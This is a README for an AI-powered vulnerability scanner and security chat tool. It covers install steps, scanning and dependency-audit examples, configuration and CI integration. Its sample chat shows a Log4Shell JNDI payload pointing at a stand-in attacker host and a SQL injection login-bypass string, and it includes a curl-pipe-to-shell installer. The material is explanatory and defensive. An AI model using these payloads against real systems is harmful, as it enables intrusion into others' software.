<div align="center">

# 🤖 NullSec GPT

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg?style=flat-square&logo=python&logoColor=white)](https://www.python.org/downloads/)
[![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=flat-square&logo=openai&logoColor=white)](https://openai.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)

**AI-powered vulnerability scanner & security assistant**

```bash
pip install nullsec-gpt
```

</div>

---

## ⚡ Features

### 🔍 Vulnerability Analysis
- **Code Review** - AI-powered source code analysis
- **Dependency Audit** - Scan for vulnerable packages
- **Config Analysis** - Security misconfigurations
- **Secret Detection** - API keys, passwords, tokens

### 🛡️ Security Assistant
- **CVE Lookup** - Explain vulnerabilities in plain English
- **Exploit Assistance** - Understand attack vectors
- **Remediation** - Get fix recommendations
- **Report Generation** - Auto-generate findings reports

### 🔗 Integrations
- OpenAI GPT-4 / GPT-3.5
- Claude API
- Local LLMs (Ollama)
- CI/CD pipelines

---

## 🚀 Quick Start

```bash
# Install
pip install nullsec-gpt

# Set API key
export OPENAI_API_KEY="sk-..."

# Scan a file
nullsec-gpt scan app.py

# Scan a directory
nullsec-gpt scan ./src --recursive

# Interactive mode
nullsec-gpt chat
```

---

## 📖 Usage

### Code Scanning

```bash
# Scan single file
nullsec-gpt scan vulnerable.py

# Output:
# 🔍 Scanning vulnerable.py...
# 
# ⚠️  CRITICAL: SQL Injection (Line 45)
#     Code: cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
#     Risk: User input directly concatenated into SQL query
#     Fix:  Use parameterized queries: cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))
#
# ⚠️  HIGH: Hardcoded Secret (Line 12)
#     Code: API_KEY = "sk-1234567890abcdef"
#     Risk: Exposed API key in source code
#     Fix:  Use environment variables: os.environ.get('API_KEY')
```

### Dependency Audit

```bash
# Scan requirements.txt
nullsec-gpt deps requirements.txt

# Scan package.json
nullsec-gpt deps package.json

# Output:
# 📦 Scanning dependencies...
# 
# ⚠️  CRITICAL: requests==2.25.0
#     CVE-2023-32681: CRLF injection vulnerability
#     Fix: Upgrade to requests>=2.31.0
```

### Interactive Chat

```bash
$ nullsec-gpt chat

╔═══════════════════════════════════════╗
║       NullSec GPT Security Chat       ║
║       Type 'help' for commands        ║
╚═══════════════════════════════════════╝

You: What is CVE-2021-44228?

🤖: CVE-2021-44228, known as "Log4Shell", is a critical remote code 
execution vulnerability in Apache Log4j 2.x (versions 2.0-beta9 to 
2.14.1).

**Impact:** CVSS 10.0 (Critical)
- Allows unauthenticated remote code execution
- Affected millions of Java applications worldwide

**Attack Vector:**
An attacker can exploit this by sending a specially crafted string 
like `${jndi:ldap://attacker.com/exploit}` that gets logged, 
triggering JNDI lookup and code execution.

**Remediation:**
1. Upgrade to Log4j 2.17.0+
2. Set `log4j2.formatMsgNoLookups=true`
3. Remove JndiLookup class from classpath

You: Analyze this code for vulnerabilities:
```python
def login(username, password):
    query = f"SELECT * FROM users WHERE user='{username}'"
    ...
```

🤖: 🚨 **SQL Injection Vulnerability Detected**

**Severity:** CRITICAL

**Issue:** User input is directly interpolated into the SQL query 
using an f-string, allowing attackers to manipulate the query.

**Attack Example:**
```
Username: admin' OR '1'='1' --
```
This would result in:
```sql
SELECT * FROM users WHERE user='admin' OR '1'='1' --'
```

**Fix:**
```python
def login(username, password):
    query = "SELECT * FROM users WHERE user = ?"
    cursor.execute(query, (username,))
```

You: exit
```

### Report Generation

```bash
# Generate security report
nullsec-gpt report ./project --output report.md

# Generate SARIF for GitHub
nullsec-gpt report ./project --format sarif --output results.sarif
```

---

## ⚙️ Configuration

```yaml
# .nullsec-gpt.yml
model: gpt-4
max_tokens: 4000
temperature: 0.1

scan:
  recursive: true
  exclude:
    - node_modules
    - .git
    - __pycache__
  
rules:
  sqli: critical
  xss: high
  secrets: critical
  insecure_random: medium

output:
  format: markdown
  verbose: true
```

---

## 🔌 API

```python
from nullsec_gpt import SecurityScanner

# Initialize scanner
scanner = SecurityScanner(
    api_key="sk-...",  # or use OPENAI_API_KEY env
    model="gpt-4"
)

# Scan code
results = scanner.scan_code("""
import pickle
data = pickle.loads(user_input)  # Dangerous!
""")

for vuln in results.vulnerabilities:
    print(f"{vuln.severity}: {vuln.title}")
    print(f"  Line: {vuln.line}")
    print(f"  Fix: {vuln.remediation}")

# Chat mode
response = scanner.chat("Explain XSS attacks")
print(response)
```

---

## 🏗️ CI/CD Integration

### GitHub Actions

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Install NullSec GPT
        run: pip install nullsec-gpt
        
      - name: Run Security Scan
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: |
          nullsec-gpt scan . --format sarif --output results.sarif
          
      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: results.sarif
```

### GitLab CI

```yaml
security_scan:
  image: python:3.11
  script:
    - pip install nullsec-gpt
    - nullsec-gpt scan . --output gl-sast-report.json --format gitlab
  artifacts:
    reports:
      sast: gl-sast-report.json
```

---

## 🔒 Privacy & Security

- **No data stored** - Code is analyzed in-memory only
- **API key protection** - Keys never logged or cached
- **Local LLM support** - Use Ollama for fully offline scanning
- **Configurable exclusions** - Skip sensitive directories

### Using Local LLMs

```bash
# Install Ollama
curl https://ollama.ai/install.sh | sh
ollama pull codellama

# Use with nullsec-gpt
nullsec-gpt scan app.py --model ollama/codellama
```

---

## 📊 Supported Languages

| Language | Support Level | Features |
|----------|--------------|----------|
| Python | Full | Code analysis, deps, secrets |
| JavaScript | Full | Code analysis, npm audit |
| TypeScript | Full | Code analysis, deps |
| Java | Full | Code analysis, Maven/Gradle |
| Go | Partial | Code analysis |
| Rust | Partial | Code analysis |
| C/C++ | Partial | Code analysis |
| Ruby | Partial | Code analysis, Gemfile |
| PHP | Partial | Code analysis |

---

## 🤝 Contributing

PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md)

## 📄 License

MIT License - see [LICENSE](LICENSE)

---

<div align="center">

*Part of the [NullSec](https://github.com/bad-antics/nullsec-linux) ecosystem*

**Powered by AI 🤖 | Built for Security ��**

</div>
